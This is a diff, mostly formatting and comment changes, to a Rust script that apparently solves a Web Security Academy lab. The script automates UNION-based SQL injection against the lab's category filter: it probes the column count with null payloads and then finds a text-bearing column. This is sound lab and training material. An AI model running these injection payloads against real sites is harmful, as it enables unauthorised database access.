@@ -40,6 +40,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a3000d004754bfc81ef6c1f006d008e.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -55,8 +56,10 @@ fn main() {
         .get(url)
         .send()
         .expect(&format!("{}", "[!] Failed to fetch the main page".red()));
-    // body of the main page
+
+    // get the body of the response
     let body = main.text().unwrap();
+
     // extract the desired text
     let desired_text = capture_pattern("Make the database retrieve the string: '(.*)'", &body)
         .expect(&format!(
@@ -64,19 +67,18 @@ fn main() {
             "[!] Failed to extract the wanted text to return. this will be fixed after reseting the lab".red()
         ));
 
-    println!(
-        "{} {}",
-        "[#] Desired text:".blue(),
-        desired_text.yellow()
-    );
+    println!("{} {}", "[#] Desired text:".blue(), desired_text.yellow());
     io::stdout().flush();
 
     for i in 1..10 {
         // number of nulls
         let nulls = "null, ".repeat(i);
+
         // payload to retreive the number of columns
         let mut payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // replace the last coma to make the syntax valid
+
         println!("[*] Trying payload: {}", payload);
+
         // fetch the page with the injected payload
         let null_injection = client
             .get(format!("{url}/filter?category={payload}"))
@@ -86,10 +88,13 @@ fn main() {
                 "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                     .red()
             ));
-        // body of the response
+
+        // get the body of the response
         let body = null_injection.text().unwrap();
+
         // extract error text to determine if the payload is valid or not
         let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
+
         // if the error text doesn't exist
         if internal_error.is_none() {
             println!(
@@ -97,14 +102,23 @@ fn main() {
                 "Number of columns: ".white(),
                 i.to_string().green().bold()
             );
+
             for j in 1..i + 1 {
-                let mut new_payload = payload.clone(); // copy the payload to work on the new copied one
+                // copy the payload to work on the new copied one
                 // these formulas works only for this lab
-                let start = 9 + 6 * j; // start index to edit
-                let end = (9 + 6 * j) + 4; // end index to edit
+                let mut new_payload = payload.clone();
+
+                // start index to edit
+                let start = 9 + 6 * j;
+
+                // end index to edit
+                let end = (9 + 6 * j) + 4;
+
                 // adjust the payload to check for a column containnig text
                 new_payload.replace_range(start..end, &format!("'{desired_text}'",));
+
                 println!("[*] Trying payload: {}", new_payload);
+
                 // fetch the page with the injected payload
                 let text_null_injection = client
                     .get(format!("{url}/filter?category={new_payload}"))
@@ -113,10 +127,13 @@ fn main() {
                         "[!] Failed to fetch the page with the injected payload to determine the number of columns"
                             .red()
                     ));
-                // body of the response
+
+                // get the body of the response
                 let body = text_null_injection.text().unwrap();
+
                 // extract error text to determine if the payload is valid or not
                 let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
+
                 // if the error text doesn't exist
                 if internal_error.is_none() {
                     println!(
@@ -124,14 +141,17 @@ fn main() {
                         "the column containing text: ".white(),
                         j.to_string().green().bold()
                     );
+
                     break;
                 }
             }
+
             break;
         } else {
             continue;
         }
     }
+
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
